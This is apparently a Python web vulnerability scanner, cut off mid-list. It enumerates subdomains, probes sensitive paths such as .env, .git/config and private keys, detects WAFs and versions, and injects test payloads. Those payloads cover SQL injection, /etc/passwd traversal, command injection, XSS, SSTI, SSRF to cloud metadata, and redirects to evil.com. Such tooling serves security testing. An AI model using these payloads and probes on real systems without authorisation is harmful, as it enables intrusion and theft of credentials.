#!/usr/bin/env python3

import sys, re, json, time, socket, ssl, datetime, threading, os, hashlib, itertools
from urllib.parse import urlparse, urljoin, urlunparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

found_lock     = threading.Lock()
fingerprints   = {}
server_profile = {}

COMMON_SUBDOMAINS = [
    "www","mail","ftp","smtp","pop","imap","webmail","admin","api","dev","staging",
    "test","beta","app","mobile","m","static","cdn","media","img","images","assets",
    "blog","shop","store","forum","portal","dashboard","panel","cpanel","whm",
    "vpn","remote","ssh","git","svn","jenkins","ci","build","deploy","prod","uat",
    "qa","demo","preview","docs","help","support","status","monitor","metrics",
    "auth","login","sso","oauth","accounts","my","user","users","ns1","ns2",
    "mx","mail2","secure","ssl","backup","db","database","mysql","redis","mongo",
    "elasticsearch","kibana","grafana","prometheus","internal","intranet","corp",
    "office","files","upload","downloads","s3","storage","cache","proxy","gateway",
    "lb","load","api2","apiv2","v1","v2","sandbox","old","legacy","new","next",
]

PARAM_PAYLOADS = {
    "sqli": [
        "'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
        "' UNION SELECT NULL--", "admin'--", "' OR SLEEP(3)--",
    ],
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
        "../windows/win.ini", "..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>", "\"><script>alert(1)</script>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
    ],
    "rce": [
        ";id", "|id", "&&id", "`id`", "$(id)", ";ls -la", "|whoami",
        ";cat /etc/passwd", "||id",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
        "{{'a'*7}}", "{{''.__class__}}", "${class.getResource('')}",
    ],
    "open_redirect": [
        "//evil.com", "https://evil.com", "//evil.com/%2f..",
        "///evil.com", "http://evil.com", "https:evil.com",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
        "http://10.0.0.1", "http://192.168.1.1", "http://[::1]",
        "http://0.0.0.0", "dict://127.0.0.1:6379/",
    ],
}

VULN_PATTERNS = {
    "sqli":          [r"(sql syntax|mysql_fetch|ORA-\d{5}|pg::\w+Error|sqlite3|PDOException|"
                      r"you have an error in your sql|SQLSTATE|Warning.*mysql_|"
                      r"Microsoft OLE DB Provider for SQL|ODBC SQL Server Driver|"
                      r"supplied argument is not a valid MySQL|Column count doesn't match)"],
    "lfi":           [r"(root:x:0:0|nobody:x:|daemon:x:|/bin/bash|/bin/sh|"
                      r"\[fonts\]|for 16-bit app support|extension_dir)"],
    "xss":           [r"(<script>alert\(1\)<\/script>|<img src=x onerror=alert\(1\)>|"
                      r"<svg onload=alert\(1\)>)"],
    "rce":           [r"(uid=\d+\(|gid=\d+\(|root@|www-data@|nobody@|"
                      r"total \d+\ndrwx|bin bash|/etc/passwd found)"],
    "ssti":          [r"\b49\b", r"configdict", r"class 'str'"],
    "open_redirect": [],
    "ssrf":          [r"(169\.254\.169\.254|ami-id|instance-id|iam/security-credentials|"
                      r"redis_version|mongo|mysql\d+\.\d+)"],
}


class BaselineProfile:
    def __init__(self):
        self.body_hash    = None
        self.status       = None
        self.content_type = ""
        self.body_len     = 0
        self.body_sample  = ""
        self.title        = ""
        self.is_catchall  = False

    def build(self, session, base_url, extra_headers):
        CANARY = "/__sitecrawler_canary_does_not_exist_xyz987__"
        try:
            r = session.get(base_url.rstrip("/") + CANARY,
                            headers=extra_headers, timeout=10, allow_redirects=True)
            self.status       = r.status_code
            self.content_type = r.headers.get("content-type", "").lower()
            body              = r.text
            self.body_len     = len(body)
            self.body_sample  = body[:500]
            self.body_hash    = _body_hash(body)
            m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
            self.title        = m.group(1).strip()[:120] if m else ""
            self.is_catchall  = (r.status_code == 200)
        except Exception:
            pass

    def is_false_positive(self, status, body, content_type):
        if self.body_hash is None:
            return False
        if not self.is_catchall:
            return False
        if _body_hash(body) == self.body_hash:
            return True
        if self.body_len and self.body_len > 0 and abs(len(body) - self.body_len) / self.body_len < 0.03:
            return True
        if self.title:
            m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
            if m and m.group(1).strip()[:120] == self.title:
                return True
        return False


def _body_hash(text):
    normalised = re.sub(r"\s+", " ", text).strip()
    return hashlib.md5(normalised.encode("utf-8", errors="replace")).hexdigest()


RISK_CRITICAL = [
    ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
    ".env.test", ".env.backup", ".env.old",
    ".git/config", ".git/HEAD", ".git/index", ".git/packed-refs", ".git/COMMIT_EDITMSG",
    ".htpasswd", "actuator/heapdump", "actuator/threaddump", "actuator/shutdown",
    "actuator/env", "actuator/beans", "phpinfo.php", "info.php", "server-status",
    "backup.sql", "dump.sql", "database.sql", "db.sqlite", "db.sqlite3", "database.db",
    "config.json", "config.yaml", "config.yml", "docker-compose.yml", "docker-compose.yaml",
    "Dockerfile", "composer.json", "WEB-INF/web.xml", "web.config", "package.json", ".git",
    ".aws/credentials", "credentials", "secrets.json", "secrets.yaml", "private.key",
    "id_rsa", "id_rsa.pub", "server.key", "server.pem", "certificate.pem",
]
RISK_HIGH = [
    "admin", "admin/login", "admin/dashboard", "admin/panel", "admin/users", "admin/api",
    "administrator", "administrator/login", "superadmin", "super-admin",
    "graphiql", "graphql-playground", "graphql/console", "playground",
    "swagger-ui", "swagger-ui.html", "openapi.json", "openapi.yaml", "api-docs",
    "debug", "debug/vars", "debug/pprof", "debug/info", "trace",
    "actuator", "actuator/health", "actuator/info", "actuator/metrics", "actuator/mappings",
    "metrics", "prometheus", ".htaccess", ".gitignore",
    "wp-login.php", "wp-admin", "xmlrpc.php", "telescope", "horizon", "nova",
    "api/debug", "api/internal", "api/private", "api/admin", "api/dev", "api/test",
    "api/v1/users", "api/v2/users", "api/v1/accounts", "users/list", "users/search",
    "console", "console/login", "backend", "backoffice", "manager", "management",
    "internal", "internal/api", "private", "private/api",
    "phpmyadmin", "pma", "adminer", "dbadmin", "database",
]
RISK_MEDIUM = [
    "graphql", "swagger", "redoc", "apidocs", "auth", "auth/oauth", "auth/oauth2",
    "oauth/token", "session", "sessions", "health", "healthcheck", "status", "ping",
    "logs", "audit", "reports", "export", "upload", "uploads", "import",
    ".DS_Store", "users", "accounts", "profiles", "me", "account",
    "api/v1/accounts", "search", "find", "notifications", "messages",
    "settings", "config", "environment", "env", "version", "info", "about",
]


def get_risk(path):
    p = path.lower().lstrip("/")
    if any(p == r or p.startswith(r + "/") for r in RISK_CRITICAL): return "CRITICAL", "#ff3355"
    if any(p == r or p.startswith(r + "/") for r in RISK_HIGH):     return "HIGH",     "#ff8800"
    if any(p == r or p.startswith(r + "/") for r in RISK_MEDIUM):   return "MEDIUM",   "#f0c040"
    return "LOW", "#4a9"


WAF_SIGNATURES = {
    "Cloudflare":         ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
    "AWS WAF/CloudFront": ["x-amz-cf-id", "x-amzn-requestid", "x-amz-request-id"],
    "Akamai":             ["x-akamai-transformed", "akamai-origin-hop", "x-check-cacheable"],
    "Imperva/Incapsula":  ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
    "Sucuri":             ["x-sucuri-id", "x-sucuri-cache"],
    "F5 BIG-IP":          ["bigipserver", "x-cnection", "f5-"],
    "Barracuda":          ["barra_counter_session"],
    "Fastly":             ["x-fastly-request-id", "fastly-restarts", "x-served-by"],
    "ModSecurity":        ["mod_security", "modsec"],
}


def detect_waf(headers, body=""):
    detected = []
    h_lower  = {k.lower(): v.lower() for k, v in headers.items()}
    body_l   = body.lower()
    for waf, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig in h_lower or sig in body_l:
                detected.append(waf)
                break
    server = h_lower.get("server", "")
    if "cloudflare" in server: detected.append("Cloudflare (server)")
    if "awselb" in server or "amazonaws" in server: detected.append("AWS ELB/CloudFront")
    if "sucuri" in server: detected.append("Sucuri Firewall")
    return list(dict.fromkeys(detected))


TECH_SIGNATURES = {
    "server":       {"nginx": "Nginx", "apache": "Apache", "microsoft-iis": "IIS",
                     "cloudflare": "Cloudflare", "openresty": "OpenResty/Nginx",
                     "caddy": "Caddy", "gunicorn": "Gunicorn (Python)", "uvicorn": "Uvicorn (Python)",
                     "jetty": "Jetty (Java)", "tomcat": "Tomcat (Java)",
                     "lighttpd": "Lighttpd", "litespeed": "LiteSpeed"},
    "x-powered-by": {"php": "PHP", "express": "Express (Node.js)", "next.js": "Next.js",
                     "asp.net": "ASP.NET", "laravel": "Laravel", "django": "Django",
                     "rails": "Ruby on Rails", "fastapi": "FastAPI", "flask": "Flask", "spring": "Spring (Java)"},
    "x-generator":  {"drupal": "Drupal", "wordpress": "WordPress", "joomla": "Joomla"},
    "via":          {"varnish": "Varnish Cache", "squid": "Squid Proxy"},
}


def detect_tech(headers):
    tech = []
    for header, sigs in TECH_SIGNATURES.items():
        val = headers.get(header, "").lower()
        if val:
            for key, label in sigs.items():
                if key in val:
                    tech.append(label)
                    break
    ck = headers.get("set-cookie", "").lower()
    if "laravel_session" in ck:   tech.append("Laravel (session)")
    if "phpsessid"       in ck:   tech.append("PHP session")
    if "asp.net_session" in ck:   tech.append("ASP.NET session")
    if "csrftoken"       in ck:   tech.append("Django (CSRF)")
    if "rack.session"    in ck:   tech.append("Rack/Rails")
    if "connect.sid"     in ck:   tech.append("Express/Node.js")
    if "wordpress_"      in ck:   tech.append("WordPress (cookie)")
    ct = headers.get("content-type", "").lower()
    if "application/json"    in ct: tech.append("JSON API")
    if "application/xml"     in ct: tech.append("XML API")
    if "application/graphql" in ct: tech.append("GraphQL")
    return list(dict.fromkeys(tech))


def extract_versions(headers, body=""):
    versions = {}
    server = headers.get("server", "")
    xpb    = headers.get("x-powered-by", "")
    for pat, key in [(r'(nginx)[/\s]([\d.]+)', "Nginx"),
                     (r'(apache)[/\s]([\d.]+)', "Apache"),
                     (r'PHP/([\d.]+)', "PHP"),
                     (r'ASP\.NET[/\s]?([\d.]+)', "ASP.NET"),
                     (r'WordPress[/\s]([\d.]+)', "WordPress")]:
        m = re.search(pat, server + " " + xpb + " " + body[:3000], re.I)
        if m:
            versions[key] = m.group(m.lastindex)
    return versions


CVE_HINTS = [
    ("PHP",       "8.0",  "CVE-2021-21703/CVE-2019-11043", "PHP < 8.0 — multiple RCE/path traversal vulnerabilities"),
    ("PHP",       "7.4",  "CVE-2019-11043",                "PHP-FPM < 7.4 — Remote Code Execution via path info"),
    ("Nginx",     "1.24", "CVE-2023-44487",                "Nginx < 1.24 — HTTP/2 Rapid Reset DoS"),
    ("Apache",    "2.4.55","CVE-2023-25690",               "Apache < 2.4.55 — mod_proxy HTTP request splitting"),
    ("Apache",    "2.4.50","CVE-2021-41773",               "Apache 2.4.49/50 — Path traversal & RCE"),
    ("WordPress", "6.4",  "CVE-2023-5561",                "WordPress < 6.4 — username enumeration / stored XSS"),
]


def _ver_lt(v, threshold):
    try:
        return tuple(int(x) for x in v.split(".")[:3]) < tuple(int(x) for x in threshold.split(".")[:3])
    except:
        return False


def check_cves(versions):
    hits = []
    for tech, thr, cve, desc in CVE_HINTS:
        v = versions.get(tech)
        if v and _ver_lt(v, thr):
            hits.append((cve, desc, v))
    return hits


def detect_auth(headers, status_code):
    hints, sec_ok, sec_miss = [], [], []
    www_auth = headers.get("www-authenticate", "")
    if www_auth:
        wl = www_auth.lower()
        if "bearer" in wl:   hints.append("Bearer token required")
        elif "basic" in wl:  hints.append("HTTP Basic Auth")
        elif "digest" in wl: hints.append("HTTP Digest Auth")
        elif "oauth" in wl:  hints.append("OAuth required")
        else:                hints.append(f"Auth: {www_auth[:60]}")
    if status_code == 401 and not www_auth: hints.append("401 Unauthorized — custom auth scheme")
    if status_code == 403: hints.append("403 Forbidden — endpoint exists, access denied")
    for hdr, label in [("strict-transport-security", "HSTS"),
                       ("content-security-policy", "CSP"),
                       ("x-frame-options", "X-Frame-Options"),
                       ("x-content-type-options", "X-Content-Type-Options"),
                       ("referrer-policy", "Referrer-Policy"),
                       ("permissions-policy", "Permissions-Policy")]:
        (sec_ok if headers.get(hdr) else sec_miss).append(label)
    return hints, sec_ok, sec_miss


def analyze_cookies(headers):
    issues, info = [], []
    raw = headers.get("set-cookie", "")
    if not raw:
        return info, issues
    for ck in raw.split(","):
        ck_l = ck.lower()
        name = ck.split("=")[0].strip()
        flags = []
        if "httponly" in ck_l: flags.append("HttpOnly")
        else: issues.append(f"'{name}' missing HttpOnly — XSS risk")
        if "secure"   in ck_l: flags.append("Secure")
        else: issues.append(f"'{name}' missing Secure — cleartext exposure")
        if "samesite" in ck_l: flags.append("SameSite")
        else: issues.append(f"'{name}' missing SameSite — CSRF risk")
        info.append(f"{name}: {', '.join(flags) if flags else 'NO security flags'}")
    return info, issues


def detect_cors(headers):
    origin  = headers.get("access-control-allow-origin", "")
    methods = headers.get("access-control-allow-methods", "")
    hdrs    = headers.get("access-control-allow-headers", "")
    creds   = headers.get("access-control-allow-credentials", "")
    info, issues = [], []
    if origin:
        info.append(f"Allow-Origin: {origin}")
        if origin == "*": issues.append("CORS wildcard (*) — any origin can read responses")
        if origin == "*" and creds.lower() == "true":
            issues.append("CRITICAL: Wildcard + credentials=true — auth bypass possible")
        if origin not in ("*", "null") and creds.lower() == "true":
            info.append("Credentialed CORS (origin-specific) — verify reflection")
    if methods:
        info.append(f"Allow-Methods: {methods}")
        if "DELETE" in methods.upper() or "PUT" in methods.upper():
            issues.append(f"Dangerous methods via CORS: {methods}")
    if hdrs:
        info.append(f"Allow-Headers: {hdrs}")
        if "authorization" in hdrs.lower():
            issues.append("Authorization header exposed via CORS")
    return info, issues


def detect_rate_limit(headers, status_code):
    info = []
    rl_hdrs = ["x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
               "x-rate-limit-limit", "x-rate-limit-remaining", "retry-after",
               "ratelimit-limit", "ratelimit-remaining", "ratelimit-reset"]
    found = {k: v for k, v in headers.items() if k.lower() in rl_hdrs}
    if found:
        for k, v in found.items():
            info.append(f"{k}: {v}")
    elif status_code == 429:
        info.append("HTTP 429 Too Many Requests — rate limiting active")
    else:
        info.append("No rate-limit headers detected — brute-force / enumeration risk")
    return info


def parse_allow_header(headers):
    allow = headers.get("allow", "") or headers.get("Allow", "")
    if allow:
        return [m.strip().upper() for m in allow.split(",") if m.strip()]
    return []


def analyze_body(body_text, content_type):
    body   = body_text or ""
    sample = body[:8000]
    result = {
        "raw":      body[:8000],
        "parsed":   None,
        "secrets":  [],
        "errors":   [],
        "hints":    [],
        "is_json":  False,
        "is_html":  False,
        "char_len": len(body),
    }
    ct_lower = content_type.lower()
    stripped = body.lstrip()

    if "application/json" in ct_lower or stripped.startswith(("{", "[")):
        try:
            parsed = json.loads(body[:65536])
            result["is_json"] = True
            if isinstance(parsed, dict):
                result["parsed"] = {"type": "object", "keys": list(parsed.keys())[:20], "data": parsed}
                flat = json.dumps(parsed).lower()
                for w in ["token", "password", "secret", "api_key", "auth", "jwt", "bearer",
                          "hash", "salt", "private", "access_key", "client_secret", "refresh_token"]:
                    if w in flat:
                        result["secrets"].append(f"Sensitive key '{w}' present in JSON response")
            elif isinstance(parsed, list):
                result["parsed"] = {
                    "type": "array", "count": len(parsed),
                    "sample_keys": list(parsed[0].keys())[:10] if parsed and isinstance(parsed[0], dict) else []
                }
        except json.JSONDecodeError as e:
            result["hints"].append(f"JSON-like body (parse error: {e})")

    if "<html" in stripped[:200].lower() or "<!doctype" in stripped[:200].lower():
        result["is_html"] = True
        m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
        if m:
            result["hints"].append(f"Page title: «{m.group(1).strip()[:120]}»")

    PATTERNS = [
        (r"(traceback|stack.?trace|exception in|at \w+\.java|\tat )",                   "errors",  "Stack trace / exception leaked"),
        (r"(syntax error|mysql error|ora-\d{5}|pg::\w+Error|sqlite3\w*error|"
          r"pdoexception|you have an error in your sql syntax)",                          "errors",  "Database error in response"),
        (r"(password|passwd|pwd)\s*[:=]\s*['\"]?\S+",                                   "secrets", "Password-like value in body"),
        (r"(api.?key|apikey|secret|client_secret)\s*[:=]\s*['\"]?\S+",                  "secrets", "API key or secret in body"),
        (r"(internal server error|application error|unhandled exception)",                "errors",  "Internal server error message"),
        (r"(debug\s*[:=]\s*true|dev.?mode|development mode|APP_DEBUG)",                 "hints",   "Debug / dev mode active"),
        (r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",            "secrets", "JWT token in response body"),
        (r"-----BEGIN (RSA |EC )?PRIVATE KEY",                                            "secrets", "Private key exposed in response"),
        (r"(AKIA|ASIA)[A-Z0-9]{16}",                                                     "secrets", "AWS Access Key ID pattern"),
        (r"ghp_[a-zA-Z0-9]{36}",                                                         "secrets", "GitHub Personal Access Token"),
        (r"<\?php",                                                                       "errors",  "PHP source code in response"),
        (r"(wp-content|wp-includes|wp-login)",                                            "hints",   "WordPress path reference"),
        (r'"version"\s*:\s*"[\d.]+"\s*[,}]',                                             "hints",   "Version field in JSON body"),
    ]
    for pat, bucket, label in PATTERNS:
        if re.search(pat, sample, re.I):
            result[bucket].append(label)

    return result


def probe_parameters(session, url, params, headers, timeout=8):
    hits = []
    for param_name, param_val in params.items():
        for vuln_type, payloads in PARAM_PAYLOADS.items():
            for payload in payloads[:3]:
                test_params = dict(params)
                test_params[param_name] = payload
                try:
                    parsed = urlparse(url)
                    base = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
                    qstr = urlencode(test_params)
                    test_url = base + "?" + qstr
                    r = session.get(test_url, headers=headers, timeout=timeout, allow_redirects=False)
                    body = r.text[:5000]

                    patterns = VULN_PATTERNS.get(vuln_type, [])
                    for pat in patterns:
                        if re.search(pat, body, re.I):
                            hits.append({
                                "param":       param_name,
                                "vuln_type":   vuln_type,
                                "payload":     payload,
                                "status":      r.status_code,
                                "evidence":    re.search(pat, body, re.I).group(0)[:120] if re.search(pat, body, re.I) else "",
                                "test_url":    test_url,
                            })
                            break

                    if vuln_type == "open_redirect" and r.status_code in (301, 302, 307, 308):
                        loc = r.headers.get("location", "")
                        if "evil.com" in loc or payload.rstrip("/") in loc:
                            hits.append({
                                "param":     param_name,
                                "vuln_type": "open_redirect",
                                "payload":   payload,
                                "status":    r.status_code,
                                "evidence":  f"Redirects to: {loc[:120]}",
                                "test_url":  test_url,
                            })
                except Exception:
                    pass
    return hits


def extract_params_from_body(body, base_url):
    found = {}
    form_actions  = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I)
    form_inputs   = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.I)
    for name in form_inputs:
        found[name] = ""
    api_params = re.findall(r'["\']([a-z_][a-z0-9_]{1,30})["\']', body[:50000], re.I)
    for p in api_params[:50]:
        if p.lower() not in ("function", "var", "let", "const", "return", "true", "false",
                              "null", "undefined", "this", "new", "class", "import", "export",
                              "from", "if", "else", "for", "while", "do", "break", "continue"):
            found.setdefault(p, "")
    return found


def probe_injections(session, base_url, path, headers):
    url  = base_url.rstrip("/") + "/" + path.lstrip("/")
    hits = []
    for vuln_type, payloads in PARAM_PAYLOADS.items():
        for payload in payloads[:2]:
            try:
                sep = "&" if "?" in url else "?"
                test_url = url + sep + "id=" + payload
                r = session.get(test_url, headers=headers, timeout=5, allow_redirects=False)
                body = r.text[:3000]
                for pat in VULN_PATTERNS.get(vuln_type, []):
                    if re.search(pat, body, re.I):
                        hits.append(f"[{vuln_type.upper()}] param=id payload={payload[:40]} — pattern matched")
                        break
            except:
                pass
    return hits


def inspect_tls(hostname, port=443):
    info = {}
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                info["tls_version"]    = ssock.version()
                info["cipher"]         = ssock.cipher()
                info["subject"]        = dict(x[0] for x in cert.get("subject", []))
                info["issuer"]         = dict(x[0] for x in cert.get("issuer", []))
                info["not_before"]     = cert.get("notBefore", "")
                info["not_after"]      = cert.get("notAfter", "")
                info["san"]            = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]
                try:
                    exp = datetime.datetime.strptime(info["not_after"], "%b %d %H:%M:%S %Y %Z")
                    info["expires_in_days"] = (exp - datetime.datetime.utcnow()).days
                except:
                    info["expires_in_days"] = None
    except Exception as e:
        info["tls_error"] = str(e)
    return info


def recon_dns(hostname):
    info = {}
    try:
        ip = socket.gethostbyname(hostname)
        info["ip"] = ip
        try:    info["rdns"] = socket.gethostbyaddr(ip)[0]
        except: info["rdns"] = "N/A"
    except Exception as e:
        info["ip_error"] = str(e)
    return info


def enumerate_subdomains(hostname, timeout=3):
    found = []
    base = ".".join(hostname.split(".")[-2:])

    def check(sub):
        fqdn = f"{sub}.{base}"
        try:
            ip = socket.gethostbyname(fqdn)
            return {"subdomain": fqdn, "ip": ip, "status": "alive"}
        except:
            return None

    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(check, s): s for s in COMMON_SUBDOMAINS}
        for f in as_completed(futures):
            result = f.result()
            if result:
                found.append(result)
    return found


def probe_method(session, url, method, headers, timeout=8):
    try:
        body, req_hdrs = None, dict(headers)
        if method in ("POST", "PUT", "PATCH"):
            body = json.dumps({})
            req_hdrs.setdefault("Content-Type", "application/json")
        t0   = time.time()
        resp = session.request(method, url, data=body, headers=req_hdrs,
                               timeout=timeout, allow_redirects=False)
        elapsed = round((time.time() - t0) * 1000)

        redirect_chain = []
        loc = resp.headers.get("location", "")
        if loc and resp.status_code in (301, 302, 307, 308):
            redirect_chain.append({"status": resp.status_code, "location": loc})
            cur = resp
            for _ in range(5):
                try:
                    cur = session.request("GET", loc, headers=req_hdrs,
                                          timeout=timeout, allow_redirects=False)
                    loc2 = cur.headers.get("location", "")
                    if loc2 and cur.status_code in (301, 302, 307, 308):
                        redirect_chain.append({"status": cur.status_code, "location": loc2})
                        loc = loc2
                    else:
                        redirect_chain.append({"status": cur.status_code, "location": cur.url})
                        break
                except:
                    break

        return {
            "method":         method,
            "status":         resp.status_code,
            "elapsed_ms":     elapsed,
            "headers":        dict(resp.headers),
            "body":           resp.text,
            "content_type":   resp.headers.get("content-type", ""),
            "content_len":    int(resp.headers.get("content-length", len(resp.content))),
            "location":       resp.headers.get("location", ""),
            "redirect_chain": redirect_chain,
            "allow_methods":  parse_allow_header(resp.headers),
            "error":          None,
        }
    except requests.exceptions.Timeout:
        return {"method": method, "status": None, "error": "TIMEOUT", "headers": {}, "body": "",
                "content_type": "", "location": "", "elapsed_ms": 0, "content_len": 0,
                "redirect_chain": [], "allow_methods": []}
    except requests.exceptions.ConnectionError:
        return {"method": method, "status": None, "error": "CONNECTION_FAILED", "headers": {}, "body": "",
                "content_type": "", "location": "", "elapsed_ms": 0, "content_len": 0,
                "redirect_chain": [], "allow_methods": []}
    except requests.exceptions.RequestException as e:
        return {"method": method, "status": None, "error": str(e)[:80], "headers": {}, "body": "",
                "content_type": "", "location": "", "elapsed_ms": 0, "content_len": 0,
                "redirect_chain": [], "allow_methods": []}


SHOW_ALL_STATUSES = True


def fingerprint_endpoint(base_url, path, session, extra_headers,
                         methods, baseline, run_inject=False, run_param_scan=False):
    parsed_path = urlparse(path)
    clean_path  = parsed_path.path
    url_params  = parse_qs(parsed_path.query)

    if parsed_path.query:
        url = base_url.rstrip("/") + "/" + clean_path.lstrip("/") + "?" + parsed_path.query
    else:
        url = base_url.rstrip("/") + "/" + clean_path.lstrip("/")

    risk, risk_color = get_risk(clean_path)

    results = {}
    for m in methods:
        results[m] = probe_method(session, url, m, extra_headers)

    interesting = {}
    for m, r in results.items():
        if r["status"] is None:
            continue
        if r["status"] in (404, 410) and not parsed_path.query:
            if not SHOW_ALL_STATUSES:
                continue
        if baseline.is_false_positive(r["status"], r["body"], r["content_type"]):
            r["false_positive"] = True
            if not SHOW_ALL_STATUSES:
                continue
        else:
            r["false_positive"] = False
        interesting[m] = r

    if not interesting:
        return None

    def _score(item):
        m, r = item
        s = r["status"]
        if m == "GET"  and s == 200: return 0
        if m == "POST" and s in (200, 201): return 1
        if s == 200: return 2
        if s in (201, 204): return 3
        if s in (301, 302, 307, 308): return 4
        if s in (401, 403): return 5
        if s == 405: return 6
        if s == 500: return 7
        return 8

    sample_m, sample = min(interesting.items(), key=_score)

    tech                         = detect_tech(sample["headers"])
    auth_hints, sec_ok, sec_miss = detect_auth(sample["headers"], sample["status"])
    cors_info, cors_issues       = detect_cors(sample["headers"])
    body_analysis                = analyze_body(sample["body"], sample["content_type"])
    rl_info                      = detect_rate_limit(sample["headers"], sample["status"])
    waf                          = detect_waf(sample["headers"], sample["body"][:1000])
    ck_info, ck_issues           = analyze_cookies(sample["headers"])
    inject_hits                  = probe_injections(session, base_url, clean_path, extra_headers) if run_inject else []
    versions                     = extract_versions(sample["headers"], sample["body"][:5000])
    cves                         = check_cves(versions)

    param_vulns = []
    if run_param_scan:
        all_params = dict(url_params)
        body_params = extract_params_from_body(sample.get("body", ""), url)
        all_params.update({k: [v] for k, v in body_params.items() if k not in all_params})
        flat_params = {k: (v[0] if isinstance(v, list) else v) for k, v in all_params.items()}
        if flat_params:
            param_vulns = probe_parameters(session, url, flat_params, extra_headers)

    working   = [m for m in interesting if interesting[m]["status"] not in (405, 501)]
    no_method = [m for m in interesting if interesting[m]["status"] in (405, 501)]

    allowed_from_options = []
    if "OPTIONS" in results and results["OPTIONS"]["allow_methods"]:
        allowed_from_options = results["OPTIONS"]["allow_methods"]

    fp = {
        "url":                  url,
        "path":                 path,
        "clean_path":           clean_path,
        "has_params":           bool(parsed_path.query),
        "url_params":           dict(url_params),
        "risk":                 risk,
        "risk_color":           risk_color,
        "methods":              results,
        "interesting":          interesting,
        "working":              working,
        "no_method":            no_method,
        "allowed_from_options": allowed_from_options,
        "sample_method":        sample_m,
        "sample_headers":       sample["headers"],
        "sample_body":          sample["body"],
        "sample_body_analysis": body_analysis,
        "tech":                 tech,
        "auth_hints":           auth_hints,
        "sec_ok":               sec_ok,
        "sec_miss":             sec_miss,
        "cors_info":            cors_info,
        "cors_issues":          cors_issues,
        "rl_info":              rl_info,
        "waf":                  waf,
        "ck_info":              ck_info,
        "ck_issues":            ck_issues,
        "inject_hits":          inject_hits,
        "param_vulns":          param_vulns,
        "versions":             versions,
        "cves":                 cves,
        "server":               sample["headers"].get("server", ""),
        "x_powered_by":         sample["headers"].get("x-powered-by", ""),
        "redirect_chain":       sample["redirect_chain"],
    }
    with found_lock:
        fingerprints[path] = fp
    return fp


API_PATHS = [
    "api", "api/v1", "api/v2", "api/v3", "api/v4", "api/v1.0", "api/v2.0", "api/v3.0",
    "api/internal", "api/public", "api/private", "api/beta", "api/alpha",
    "api/admin", "api/dev", "api/debug", "api/test", "apis", "api-docs", "api-gateway",
    "rest", "rest/v1", "rest/v2", "restapi", "rpc", "jsonrpc", "xmlrpc",
    "auth", "auth/login", "auth/logout", "auth/register", "auth/signup",
    "auth/token", "auth/refresh", "auth/verify", "auth/reset", "auth/forgot",
    "auth/oauth", "auth/oauth2", "auth/callback", "auth/me", "auth/profile",
    "auth/password", "auth/password/reset", "auth/password/change",
    "auth/2fa", "auth/mfa", "auth/otp", "auth/verify-email", "auth/resend",
    "api/auth", "api/auth/login", "api/auth/logout", "api/auth/register",
    "api/auth/token", "api/auth/refresh", "api/auth/verify", "api/auth/me",
    "api/auth/forgot-password", "api/auth/reset-password",
    "api/auth/oauth", "api/auth/oauth2", "api/auth/callback",
    "api/auth/2fa", "api/auth/mfa", "api/auth/otp",
    "api/v1/auth", "api/v1/auth/login", "api/v1/auth/logout",
    "api/v1/auth/register", "api/v1/auth/token", "api/v1/auth/refresh",
    "api/v1/auth/me", "api/v1/auth/forgot-password", "api/v1/auth/reset-password",
    "api/v2/auth", "api/v2/auth/login", "api/v2/auth/logout", "api/v2/auth/register",
    "api/v2/auth/token", "api/v2/auth/refresh",
    "oauth", "oauth2", "oauth/token", "oauth/authorize", "oauth/callback",
    "oauth/userinfo", "oauth/revoke", "oauth/introspect",
    "sso", "saml", "saml/acs", "saml/metadata", "saml/login", "saml/logout",
    ".well-known/openid-configuration", ".well-known/jwks.json",
    ".well-known/oauth-authorization-server",
    "login", "logout", "register", "signup", "signin", "signout",
    "sign-in", "sign-out", "sign-up",
    "token", "tokens", "refresh-token", "refresh",
    "session", "sessions", "session/new", "session/destroy",
    "password", "password/reset", "password/change", "password/forgot",
    "forgot-password", "reset-password", "change-password",
    "2fa", "mfa", "otp", "verify", "verify/email", "confirm", "confirmation",
    "users", "user", "user/me", "users/me", "users/profile", "users/list", "users/search",
    "account", "accounts", "account/settings", "account/profile",
    "profile", "profiles", "me", "members", "member",
    "api/v1/users", "api/v2/users", "api/v1/user", "api/v2/user",
    "api/v1/users/me", "api/v2/users/me",
    "api/v1/accounts", "api/v2/accounts", "api/v1/profile", "api/v2/profile",
    "api/v1/me", "api/v2/me",
    "admin/users", "admin/accounts",
    "admin", "admin/login", "admin/dashboard", "admin/panel", "admin/users", "admin/api",
    "administrator", "administrator/login", "manager", "management",
